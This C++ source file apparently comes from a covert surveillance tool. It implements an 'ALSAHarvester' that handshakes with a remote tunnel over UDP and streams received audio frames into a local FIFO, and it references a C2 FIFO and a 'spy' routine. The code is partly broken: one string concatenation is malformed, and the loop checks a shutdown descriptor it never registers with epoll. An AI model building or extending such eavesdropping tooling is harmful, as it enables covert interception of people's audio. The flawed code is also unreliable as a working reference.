#include "alsa_harvester.hpp"

void ALSAHarvester::exec_spy() {
    int rc;
    char status[sizeof(Status) + sizeof(int)];
    Status status_code;
    int argv;

    fifo_in_path_ = fifo_path_ + (std::string) + "_in";
    tunnel_fifo_in_ = open(fifo_in_path_.c_str(), O_RDONLY);
    if (tunnel_fifo_in_ < 0) {
        write_fifo_error("Reader failed to connect" + (std::string) strerror(errno));
        return;
    }

    std::cout << MAGENTA << "Opened " << fifo_in_path_.c_str() << RESET;

    rc = udp_handshake((void*) hw_in_.c_str(), hw_in_.size());
    if (rc < 0) {
        write_fifo_error("Failed initial handshake" + (std::string) strerror(errno));
        close_fifos();
        return;
    }


    fd_set argfds;
    FD_ZERO(&argfds);
    FD_SET(tunnel_socket_, &argfds);
    struct timeval tv = {3, 0}; // 3 seconds timeout
    int ready = select(tunnel_socket_ + 1, &argfds, NULL, NULL, &tv);
    if (ready > 0 && FD_ISSET(tunnel_socket_, &argfds)) {
        rc = recvfrom(tunnel_socket_, status, sizeof(status), 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
        if (rc <= 0 || rc != sizeof(status)) {
            write_fifo_error("Failed to receive arguments from tunnel_socket_: " + (std::string) strerror(errno));
            close_fifos();
            return;
        } else {
            memcpy(&status_code, status, sizeof(Status));
            memcpy(&argv, status + sizeof(Status), sizeof(int));
    
            int wrc = write(tunnel_fifo_, &argv, sizeof(argv));
            if (wrc <= 0) {
                std::cout << MAGENTA << "Error while sending argument: " << argv << RESET;
            }
            if (status_code == EXEC_ERROR) {
                std::cout << MAGENTA << "EXEC ERROR " << RESET;
                close_fifos();
                return;
            } else if (status_code == EXEC_SUCCESS) {
                std::cout << MAGENTA << "Initialization successful" << RESET;        
            }
        }
    } else if (ready == 0) {
        write_fifo_error("Timeout..");
        close_fifos();
    } else {
        write_fifo_error("Error during select" + (std::string) strerror(errno));
        close_fifos();
    }

    int is_success = 0;
    read(tunnel_fifo_in_, &is_success, sizeof(is_success));

    udp_handshake(&is_success, sizeof(is_success));

    if (!is_success) {
        close_fifos();
        write_fifo_error("Local initialization failed..");
        return;
    } 

    std::cout << MAGENTA << "Successfully initialized, everything is in order" << RESET;

    close(tunnel_fifo_in_); // We don't need it anymore
    tunnel_fifo_in_ = -1;

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        close_fifos();
        return;
    }

    struct epoll_event frame_event;
    frame_event.data.fd = tunnel_socket_;
    frame_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &frame_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
        return;
    } 

    char frame[BUFFER_FRAMES * 4]; // Max allowed is stereo
    struct epoll_event events[2];
    int timeout = 5000;
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, timeout);
        if (nfds < 0) {
            write_fifo_error("Error ocurred during epoll_wait" + (std::string) strerror(errno));
            break;
        } else if (nfds == 0) {
            write_fifo_error("Timeout occurred. Terminating...");
            break;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } else if (events[i].data.fd == tunnel_socket_) {
                int bytes_read = recvfrom(tunnel_socket_, frame, sizeof(frame), 0, (struct sockaddr*) &tunnel_end_addr_, &tunnel_end_addr_len_);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    if (memcmp(frame, OUT_KEY, OUT_KEY_LEN) == 0) {
                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                        return;
                    }
                    rc = write(tunnel_fifo_, frame, bytes_read);
                    if (rc < 0) {
                        return;
                    }
                }
            }
        }
    }
    close_fifos();
    return;
}

void ALSAHarvester::spawn_window() {
    std::string buffer_frames_str = std::to_string(BUFFER_FRAMES);
    std::string sample_rate_str = std::to_string(SAMPLE_RATE);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_alsa_harvester", 
        "-e", ALSA_HARVESTER_SCRIPT_PATH, 
        fifo_path_.c_str(),
        hw_out_.c_str(),
        buffer_frames_str.c_str(), sample_rate_str.c_str(),
        out_name_.c_str(),
        (char*)NULL
    );
}

void ALSAHarvester::set_hws(const std::string& __hw_in, const std::string& __hw_out) {
    hw_in_ = __hw_in;
    hw_out_ = __hw_out;
}

void ALSAHarvester::close_fifos() {
    if (tunnel_fifo_ != -1) {
        close(tunnel_fifo_);
        tunnel_fifo_ = -1;
    }
    if (tunnel_fifo_in_ != -1) {
        close(tunnel_fifo_in_);
        tunnel_fifo_in_ = -1;
    }
}